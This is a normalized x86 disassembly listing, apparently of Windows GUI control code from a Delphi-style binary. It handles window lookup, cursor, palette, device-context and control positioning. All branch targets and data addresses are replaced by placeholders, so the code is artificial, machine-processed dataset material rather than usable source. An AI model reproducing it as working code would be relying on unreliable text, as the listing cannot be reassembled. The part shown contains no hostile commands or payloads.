jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_432fa4
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_4328d0
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_43ceac
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433279
mov eax [ rw-data ]
call sub_4030f8
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_44b71c
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_435c5c
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_43279c
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_44f388
sub_433279
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403284
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_4030f8
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_403284
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
sub_433308
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_431970
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43333c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_433308
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_4345d4
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_438b7c
test eax eax
je r-xdata
mov esi eax
sub_433384
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_413898
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx ] eax
sub_4333ac
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_413b90
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_4030f8
xor eax eax
mov [ ebx ] eax
sub_4333cc
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4333fc
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_413df4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4334ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413e58
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_433485
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_433638
call sub_403918
call sub_403918
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4139f4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_41da58
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_4334b8
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_413df4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_433556
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43355d
mov eax [ rw-data ]
call sub_413e58
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_43352e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_433638
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41dab4
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4139f4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41da58
test al al
je r-xdata
sub_433564
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax esi
call sub_433638
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d708
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_433590
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dc38
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_41dc3c
mov eax [ ebp - 0x4 ]
call sub_433684
mov eax [ rw-data ]
call sub_413df4
mov ebx eax
xor eax eax
push ebp
push sub_433615
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_413898
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413e58
retn
call sub_4333fc
sub_433638
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_41dc3c
mov edx ebx
mov eax [ rw-data ]
call sub_413e08
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_433684
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4350ec
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_4336b0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c8
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_4336ec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414110
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_433734
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_4337f0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4338bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4338c4
lea eax [ ebp - 0x1c ]
call sub_403eb4
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_4032f4
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_443cdc
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408aac
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403f08
sub_4338e0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_433947
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_440da8
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_434a90
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
mov edx [ eax + 0x64 ]
pop eax
call sub_4042c0
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43394e
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov al 0x1
sub_433954
push ebx
mov ebx eax
mov eax ebx
call sub_440dd0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_433988
push ebx
mov ebx eax
mov eax ebx
call sub_440e20
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_4042c0
je r-xdata
mov al 0x1
pop ebx
retn
sub_4339c0
push ebx
mov ebx eax
mov eax ebx
call sub_440e5c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4339f4
push ebx
mov ebx eax
mov eax ebx
call sub_41a5cc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_433a1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_434ac0
sub_433a3c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_433a5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403f08
sub_433a80
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4349b0
sub_433aa0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_433acc
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_4042c0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_433b30
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43440c
sub_433b50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4343f8
sub_433b70
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_433b90
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419cdc
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb54
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_434b40
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4336b0
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_435a1c
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_433c68
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_40346c
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_4532a0
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403454
push edi
xor ecx ecx
mov edx 0xb039
call sub_435c5c
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_434430
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_4032f4
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_4030f8
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_4030f8
mov eax [ edi + 0x68 ]
call sub_4030f8
mov eax [ edi + 0x64 ]
call sub_40861c
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419d28
test bl bl
jle r-xdata
sub_433d34
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_433d5c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_4032f4
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433de4
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_4340e4
sub_433e04
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_4030f8
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_436a78
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_4032f4
mov edx ebx
mov eax edi
call sub_419dac
mov eax ebx
mov si 0xffd9
call sub_4032f4
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_433ecc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41a13c
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_435c5c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_435c5c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_435c5c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_435c5c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_435c5c
sub_433f60
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419ff8
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_434a48
jmp r-xdata
xor edx edx
mov eax esi
call sub_433e04
sub_433fa4
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_4032f4
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_433de4
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_4032f4
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_43404c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_4361ec
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_434ed8
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4340e4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_435c5c
mov eax ebx
mov si 0xffd0
call sub_4032f4
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_4032f4
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_4340e4
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_43b594
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_434200
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_434224
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_43424c
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_434270
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
